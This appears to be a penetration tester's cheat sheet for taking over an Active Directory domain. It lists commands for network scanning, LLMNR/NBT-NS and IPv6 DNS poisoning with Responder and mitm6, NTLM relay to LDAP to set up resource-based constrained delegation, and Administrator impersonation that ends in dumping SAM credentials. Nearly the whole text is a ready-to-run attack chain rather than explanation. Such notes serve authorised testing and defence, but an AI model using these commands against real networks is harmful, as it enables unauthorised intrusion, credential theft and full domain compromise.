# Quickwin - NTLM Relay to LDAP with RBCD

## Recon

```
nmap -sS -sV -p- --min-rate 10000 -oA full_scan <range>
nmap -sU -sV --top-ports 200 -oA udp_scan <range>
```

## IPv6 DNS Takeover + LLMNR/NBT-NS poisoning with responder

- `-d` enable the wpad module
- `-w` enable the dhcp module

```
responder -I <interface> -wd
mitm6 -d <domain>
```

### NTLM Relay to LDAP

- `--delegate-access` instruct ntlmrelayx to automatically configure Resource-Based Constrained Delegation (RBCD) when a machine account is successfully relayed to LDAP
- `--no-smb-server` disable the internal smb server of ntlmrelayx

```
ntlmrelayx -t ldap://dc.example.com:389 --delegate-access --no-smb-server
```

### Request a Service Ticket and escalade to DA

```
getST.py -spn 'cifs/<target_rbcd>.example.com' -impersonate Administrator -dc-ip '<dc_ip>' '<example.com>/<machine_account_created>$:<password'
KRB5CCNAME=Administrator.ccache netexec smb <ip_target_rbcd> --use-kcache --sam
```

## Sources
- https://xbz0n.sh/blog/from-zero-creds-to-ea


